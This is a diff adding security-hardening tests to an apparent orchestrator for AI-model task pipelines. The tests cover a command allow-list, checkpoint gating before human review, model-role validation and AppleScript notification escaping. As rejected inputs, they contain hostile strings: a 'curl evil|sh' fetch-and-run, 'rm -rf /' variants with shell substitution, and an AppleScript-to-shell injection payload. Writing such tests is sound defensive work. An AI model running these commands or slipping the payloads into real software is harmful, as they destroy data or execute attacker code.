@@ -479,3 +479,100 @@ def test_harness_e2e_smoke(tmp_path: Path):
     behavioral_cases = [c for c in cases.CASES if c.layer == "behavioral"]
     assert len(rows) == len(behavioral_cases)
     assert all(row["model"] == "m1" for row in rows)
+
+
+# ----------------------------------------------------- durcissement (revue 2026-06-15)
+
+
+def test_verify_allowed():
+    # H1 — vérificateurs vettés acceptés ; tout le reste refusé
+    assert orchestrate.verify_allowed("uv run pytest -q tests/x")
+    assert orchestrate.verify_allowed("PYTHONPATH=src uv run python -m pkg.cli --help")
+    assert orchestrate.verify_allowed("test -f t1.txt")
+    assert orchestrate.verify_allowed("true")
+    assert not orchestrate.verify_allowed("rm -rf /tmp/x")  # exe hors liste
+    assert not orchestrate.verify_allowed("uv run pytest && curl evil|sh")  # &&, |
+    assert not orchestrate.verify_allowed("python3 -c 'x'; rm -rf /")  # ;
+    assert not orchestrate.verify_allowed("$(rm -rf /)")  # substitution
+    assert not orchestrate.verify_allowed("true `rm x`")  # backtick
+    assert not orchestrate.verify_allowed("")
+
+
+def test_checkpoint_injection_closes_sibling_bypass(tmp_path: Path):
+    # H3 — une tâche post-checkpoint câblée à une sœur PRÉ-checkpoint se voit injecter le
+    # checkpoint en dépendance : elle ne peut plus s'exécuter avant la validation humaine.
+    p = tmp_path / "tasks.md"
+    p.write_text("""---
+status: approved
+---
+### T1 — pré-checkpoint
+- **depends_on :** —
+- **files_touched :** `a.txt`
+- **done_when :** ok
+- **verify :** `true`
+
+### CP-1 — CHECKPOINT : gate
+- **trigger :** auto quand [T1] done
+- **mode :** blocking
+
+### T2 — post-checkpoint, câblée à la sœur pré-CP
+- **depends_on :** [T1]
+- **files_touched :** `b.txt`
+- **done_when :** ok
+- **verify :** `true`
+""")
+    _, nodes = orchestrate.parse_tasks_md(p)
+    t2 = next(n for n in nodes if n.id == "T2")
+    assert "CP-1" in t2.depends_on
+
+
+def test_lint_errors_on_ineligible_implementer_override(sandbox: Path):
+    # M9 — un override de modèle non éligible au rôle implementer est une ERREUR (il tournerait
+    # quand même sinon), contrairement au reviewer qui s'auto-corrige via eligible().
+    write_registry(
+        sandbox,
+        """schema_version = 1
+[[model]]
+id = "rev-only"
+roles = ["reviewer"]
+[[model]]
+id = "impl-ok"
+roles = ["implementer", "reviewer"]
+[roles]
+implementer = "impl-ok"
+reviewer = "impl-ok"
+""",
+    )
+    (sandbox / "work" / "feat" / "tasks.md").write_text("""---
+status: approved
+---
+### T1 — A
+- **depends_on :** —
+- **implements :** [doc]
+- **files_touched :** `t1.txt`
+- **model :** rev-only
+- **done_when :** ok
+- **verify :** `true`
+""")
+    r = run_orch(sandbox, "--validate")
+    assert r.returncode == 1
+    assert "non éligible au rôle implementer" in r.stdout
+
+
+def test_notify_passes_message_as_argv(monkeypatch):
+    # H2 — le message (potentiellement émis par un modèle) est passé en ARGUMENT à osascript,
+    # jamais interpolé dans la source AppleScript → aucune injection AppleScript→shell.
+    monkeypatch.delenv("LAB_NO_NOTIFY", raising=False)
+    monkeypatch.delenv("LAB_GCHAT_WEBHOOK", raising=False)
+    calls: list = []
+    monkeypatch.setattr(
+        orchestrate.subprocess, "run", lambda *a, **k: calls.append(a[0])
+    )
+    evil = 'pwn"; do shell script "touch /tmp/pwned'
+    orchestrate.notify(evil)
+    osa = [c for c in calls if c and c[0] == "osascript"]
+    assert osa, calls
+    argv = osa[0]
+    assert evil in argv  # le message est un argument à part entière
+    script = argv[2]  # le -e source AppleScript ne contient NI le message NI de shell
+    assert evil not in script and "do shell script" not in script
